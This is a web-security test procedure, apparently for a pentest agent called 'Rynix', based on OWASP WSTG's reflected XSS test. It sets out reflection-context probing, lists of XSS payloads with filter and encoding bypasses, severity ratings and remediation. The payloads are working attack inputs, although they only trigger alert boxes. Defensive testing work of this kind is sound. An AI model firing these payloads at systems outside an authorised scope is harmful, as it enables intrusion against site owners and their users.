---
id: WSTG-INPV-01
title: Testing for Reflected Cross-Site Scripting
category: Input Validation
severity_range: Medium-High
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting
---

# WSTG-INPV-01: Testing for Reflected Cross-Site Scripting

## Summary

Reflected Cross-Site Scripting (XSS) occurs when user-supplied input is included in the HTTP response without proper encoding. The attack payload is delivered via a crafted URL or form submission and executes in the victim's browser when they visit the malicious link.

## Test Objectives

- Identify parameters that are reflected in HTTP responses
- Assess input validation and output encoding applied to reflected values
- Determine if XSS payloads can execute in the application context

## Prerequisites

- Target URL is accessible via `http_probe`
- Application entry points have been mapped (WSTG-INFO-06)

## Test Steps

### Step 1: Identify Input Reflection Points

**CLI Actions:**
1. Use `curl` to retrieve all requests to the target
2. Identify parameters in URLs and form submissions
3. For each parameter, use `curl` to inject a unique canary string:
   ``
   GET /search?q=CANARY12345REFLECT HTTP/1.1
   Host: target.com
   ``
4. Check if `CANARY12345REFLECT` appears in the response body or headers
5. Use `save to manual-review file` for each endpoint with confirmed reflection

### Step 2: Determine Reflection Context

For each reflection point, identify where the input appears in the HTML:

**a) Inside HTML body:**
```html
<p>Your search for "CANARY12345REFLECT" returned no results</p>
```

**b) Inside HTML attribute:**
```html
<input type="text" value="CANARY12345REFLECT">
```

**c) Inside JavaScript:**
```javascript
var search = "CANARY12345REFLECT";
```

**d) Inside URL/href:**
```html
<a href="https://target.com/page?q=CANARY12345REFLECT">Link</a>
```

### Step 3: Test Context-Appropriate Payloads

**CLI Actions:**
For each reflection context, use `curl` with appropriate payloads. Use `curl --data-urlencode` for payloads that need URL encoding.

### Step 4: Test Filter Bypass

**CLI Actions:**
If basic payloads are blocked, test bypasses with `curl`:
1. Try case variations
2. Try encoding variations (use `curl --data-urlencode`, double encoding)
3. Try alternative event handlers
4. Try tag variations

### Step 5: Verify Execution

**CLI Actions:**
1. For payloads that appear unencoded in the response, use `save to manual-review file` to preserve the request
2. Verify that the payload is rendered in a way that would execute JavaScript in a browser
3. Check if Content-Security-Policy headers would block execution (reference WSTG-CONF-12)

## Payloads

### Basic Detection Payloads
```
<script>alert('XSS')</script>
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<details open ontoggle=alert('XSS')>
```

### HTML Attribute Context Payloads
```
" onmouseover="alert('XSS')
" onfocus="alert('XSS')" autofocus="
" onload="alert('XSS')
'><img src=x onerror=alert('XSS')>
" style="background:url(javascript:alert('XSS'))
```

### JavaScript String Context Payloads
```
';alert('XSS');//
\';alert(\'XSS\');//
</script><script>alert('XSS')</script>
'-alert('XSS')-'
\"-alert('XSS')-\"
```

### URL/href Context Payloads
```
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

### Filter Bypass Payloads
```
<ScRiPt>alert('XSS')</ScRiPt>
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<svg/onload=alert('XSS')>
<img src=x onerror=alert`XSS`>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<video src=x onerror=alert('XSS')>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS') src=1>">
```

### Encoding Bypass Payloads
```
%3Cscript%3Ealert('XSS')%3C/script%3E
%253Cscript%253Ealert('XSS')%253C/script%253E
&#60;script&#62;alert('XSS')&#60;/script&#62;
&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
```

## Detection Criteria

A finding should be logged when:
- User-supplied input is reflected in the response without HTML entity encoding
- XSS payloads appear unmodified in the HTML response
- JavaScript event handler payloads are rendered in attribute contexts
- Payloads would execute JavaScript in a browser (even if CSP might block it - note CSP separately)

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| XSS executes in authenticated context, can access session cookies (no HttpOnly) | High |
| XSS executes but cookies are HttpOnly (can still perform actions as user) | High |
| XSS in admin-only pages | High |
| XSS in public pages with limited session impact | Medium |
| XSS blocked by strong CSP (nonce-based) | Low |
| Self-XSS only (requires user to paste payload) | Informational |

## Remediation

- Implement context-aware output encoding (HTML entity, JavaScript, URL, CSS encoding)
- Use Content-Security-Policy headers with nonces or hashes
- Set HttpOnly flag on session cookies
- Use modern frameworks with built-in auto-escaping (React, Angular, Vue)
- Validate input on the server side (allowlist approach)
- Consider using a WAF as defense in depth

## References

- [OWASP Testing Guide - Reflected XSS](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

